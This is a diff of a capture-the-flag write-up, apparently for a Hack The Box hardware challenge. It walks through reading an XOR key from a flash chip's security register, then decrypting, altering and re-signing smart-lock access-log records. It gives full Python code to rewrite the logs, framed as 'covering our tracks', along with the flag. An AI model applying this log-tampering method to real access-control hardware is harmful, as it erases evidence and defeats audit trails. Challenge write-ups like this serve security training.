@@ -16,7 +16,7 @@ The good news is that we are given the source code as well for the event logging
 
 That's what we need to start off with, as well as grabbing the datasheet for the chip [Winbond W25Q128](https://www.pjrc.com/teensy/W25Q128FV.pdf).
 
-## Analysis
+## Tech Analysis
 
 The `client.py` is the small python client is illustrating a method how to communicate with the chip. The `exchange` function is defined entirely and an example command is also given at the end of the script, this `jedec_id = exchange([0x9F], 3)` line, which demonstrates how to interact with the hardware. Trying this out, at first, returns our assumption that indeed we are working with a Winbond W25Q128. `0xEF` (239 in decimal) indicates the manufacturer ID, which is Winbond. The `0x40` (64 in decimal) signifies Serial Flash Memory, while the `0x18` (24 in decimal) represents the memory capacity and organization, meaning 128MB chip (16MB) memory organized as 64 sectors of 4KB each.
 
@@ -109,10 +109,122 @@ uint32_t calculateCRC32(const uint8_t *data, size_t length) {
     return ~crc;
 }
 ```
+The `log_event` function is a tad bit longer but it is easy to understand. It essentially does what we explained already. Prepares the chip for data transmission, initializes the _SmartLockEvent_ structure, prepares the data for transfer, calculates the CRC32 of the new event, appends this value, and writes the buffer data to the flash then reads back in order to verify. There are also print statements for debug. What's more important is that we have an `encrypt_data` function as well. The data is encrypted before written to the memory. This is what we need to figure out.
 
+Reading through the code, we quickly identified `read_security_register(register_number, 0x52, key); // register, address`. This also appears in the datasheet documentation. The `encrypt_data` has parameters of what data to encrypt, its length, register number and address. Fortunately, we know the address of encryption key which is `0x52`. The algorithm is a simple XOR with the key we read from that memory. This means the first step is retrieving that security registers. Let's not also point that out that these cannot be erased or overwritten, these are OTP (one time programmable) memory slots.
 
+Digging into the datasheet... look what we find at page 71.
+
+![image](https://github.com/respawnRW/writeups/assets/163560495/3510596e-18cf-4cee-8b28-0ac20519a3f1)
+
+And as mentioned earlier, yes.
+
+![image](https://github.com/respawnRW/writeups/assets/163560495/2a3cf0de-1a24-4231-970b-18f518f3ba2e)
+
+Having finished reading the `log_event.c` we have pretty much everything to get down to coding. 
+
+The toughest task of this challenge is in-depth code analysis and understanding.
+
+Our plan is going to be like this:
+```txt
+- get encryption key
+- read data
+- parse data & modify records
+- process flashing
+- retrieve flag (if job done)
+```
+Before we finally get down to coding, we need to check for each instruction that we need from the datasheet.
+
+Fortunately this is also visible from the table of contents. Write Enable `06h`, Read Data `03h`, Page Program `02h`, Sector Erase `20h` etc.
+
+These are going to be the instructions we're calling the `exchange` function with, in hex, such as `0x06`, so always refer back to datasheet.
 
 ## Putting it all Together
+
+The header of our function and the exchange function is going to untouched since building on top of what is given.
+
+What we start with is a `get_encryption_key()` function. `0x48` is the instruction to read from security register. `0x52` is the security register.
+
+```python
+def get_encryption_key():
+    key_response = exchange([0x48, 0, 16, 0x52, 0, 0], 12)
+    print(f"Encryption Key: {key_response}")
+    return bytearray(key_response)
+```
+Next function is self-explanatory, `read_data`. From specific address and length. Instruction is `03h`.
+```python
+def read_data(length, addr):
+    cmd = [0x03, (addr >> 16) & 0xff, (addr >> 8) & 0xff, addr & 0xff]
+    return bytearray(exchange(cmd, length))
+```
+And finally, we have the `write_data` function, the instruction is `06h` to enable writing and it works in correlation with page program `02h`. This function is doing the waiting, due to the while loop, until it receives job finished (read status register `05h`). This can be used at any time, it's practically returning the busy status bit, checking if the device can accept another instruction. Find more about this on p. 30 of datasheet.
+```python
+def write_data(data, addr):
+    exchange([0x06])  # Enable writing
+    cmd = [0x02, (addr >> 16) & 0xff, (addr >> 8) & 0xff, addr & 0xff] + list(data)
+    exchange(cmd, len(data))
+    while True:
+        status = exchange([0x05], 1)[0]
+        if status & 1 == 0:
+            break
+```
+Finally we have arrived at the most sensitive segment of script. Let's construct our `modify_records` function. We are going to parse the data!
+
+It iterates over the data in chunks of 16 bytes, each representing a record. We also know that for each record 4 bytes is the CRC32 in the end and that data is not encrypted. That is why we exclude from our decryption mechanism. We are working with 12 bytes, decrypting the record using the provided encryption key (retrieved earlier). The operation is bitwise XOR. Next we extract the user ID from the decrypted record. What's left is just a simple if statement, if found we do stuff, if not, we iterate further. If we found the required `user_id` - we print out a message, modify the record, recalculate the CRC for the modified record, update the CRC record, and finally re-encrypt the modified record. 
+
+This way we are maintaining data integrity and won't raise any red flags.
+
+This was the essential function for our challenge as it allows us to cover out tracks, eliminate any trace, hehe.
+
+```python
+def modify_records(data, key):
+    found_user_id = False
+    for i in range(0, len(data), 16):    # 16 bytes each record
+        record = data[i:i+12]  # Extract record excluding CRC (4 bytes is CRC)
+        decrypted_record = bytearray(b ^ key[j % len(key)] for j, b in enumerate(record))
+        user_id = struct.unpack("<H", decrypted_record[6:8])[0]
+        # Check and modify User ID 0x5244
+        if user_id == 0x5244:
+            found_user_id = True
+            print(f"Modifying record for User ID {user_id} at position {i}.")
+            struct.pack_into("<H", decrypted_record, 6, 0x5299)  # Change user ID
+            new_crc = binascii.crc32(decrypted_record) & 0xffffffff  # Recalculate CRC
+            struct.pack_into("<I", data, i+12, new_crc)  # Update CRC in original data
+            # Re-encrypt modified record
+            for j, b in enumerate(decrypted_record):
+                data[i+j] = b ^ key[j % len(key)]
+    if not found_user_id:
+        print("No records with User ID 0x5244 found, but proceeding with operations...")
+    return data
+```
+And finally the `process_flash` function which is responsible for processind the modified records and writing them back to the flash chip.
+
+Enable writing instruction is `06h` and erase sector is `20h`. Iterate over the modified records in 256 byte chunks and call the write_data for each.
+
+```python
+def process_flash(records):
+    exchange([0x06])  # Enable writing
+    exchange([0x20, 0, 0, 0])  # Erase sector
+    print("Erasing sector and writing modified data back...")
+    for i in range(0, len(records), 256):
+        write_data(records[i:i+256], i)
+```
+Last function we will create is the `retrieve_flag()`. This functino is going to calculate the memory address where the flag is stored based on the given constant `FLAG_ADDRESS`. Iterating over the bytes of that address, reversing their order and shifting them to create the final address,then calling the `read_data` to read the flag data from the calculated address. 
+
+Retrieved flag is parsed to remove trailing padding bytes (`0xFF`) and converted into human-readable format.
+
+```python
+def retrieve_flag():
+    flag_addr = sum(byte << (8 * idx) for idx, byte in enumerate(reversed(FLAG_ADDRESS)))
+    flag_data = read_data(50, flag_addr)
+    print("Flag found:", flag_data.rstrip(b"\xff").decode())
+```
+
+## #Getaway Solution - cover our tracks
+
+Now let's put this together and wrap this up.
+
+The header part of the script alongside with the `exchange` function is "untouched way" from the given `client.py` script.
 
 ```python
 import socket
@@ -166,15 +278,15 @@ def write_data(data, addr):
 
 def modify_records(data, key):
     found_user_id = False
-    for i in range(0, len(data), 16):
-        record = data[i:i+12]  # Extract record excluding CRC
+    for i in range(0, len(data), 16):    # 16 bytes each record
+        record = data[i:i+12] # Extract record excluding CRC (4 bytes is CRC)
         decrypted_record = bytearray(b ^ key[j % len(key)] for j, b in enumerate(record))
         user_id = struct.unpack("<H", decrypted_record[6:8])[0]
         # Check and modify User ID 0x5244
         if user_id == 0x5244:
             found_user_id = True
             print(f"Modifying record for User ID {user_id} at position {i}.")
-            struct.pack_into("<H", decrypted_record, 6, 0x5245)  # Change user ID
+            struct.pack_into("<H", decrypted_record, 6, 0x5299)  # Change user ID
             new_crc = binascii.crc32(decrypted_record) & 0xffffffff  # Recalculate CRC
             struct.pack_into("<I", data, i+12, new_crc)  # Update CRC in original data
             # Re-encrypt modified record
@@ -193,7 +305,7 @@ def process_flash(records):
 
 def retrieve_flag():
     flag_addr = sum(byte << (8 * idx) for idx, byte in enumerate(reversed(FLAG_ADDRESS)))
-    flag_data = read_data(100, flag_addr)
+    flag_data = read_data(50, flag_addr)
     print("Flag found:", flag_data.rstrip(b"\xff").decode())
 
 key = get_encryption_key()
@@ -203,8 +315,15 @@ process_flash(modified_records)
 retrieve_flag()
 ```
 
-![image](https://github.com/respawnRW/writeups/assets/163560495/b5650366-07bc-4a1e-8eab-82047fa9d255)
+And find how it runs, first execution - when the userID is found and altered - covering our tracks ;)
 
+![image](https://github.com/respawnRW/writeups/assets/163560495/f3d4a3b4-43dd-4b7a-ada9-125747b1f1cf)
+
+And this is what it looks like if we run again - no records are going to be found:
+
+![image](https://github.com/respawnRW/writeups/assets/163560495/7d1b74af-1c80-4525-8b81-a18cd41ce3ba)
+
+Job done! As final concluding thought, need to point out that manipulating data in a flash memory using erase or program instructions carries a risk. Always you should create a full memory dump of the chip. With a local dump of the memory, you can always restore it to its original state if needed. Especially if doing scripts or programatically manipulating the memory of a chip. Irreversible data loss is inevitable.
 
 Flag: `HTB{n07h1n9_15_53cu23_w17h_phy51c41_4cc355!@}`
 
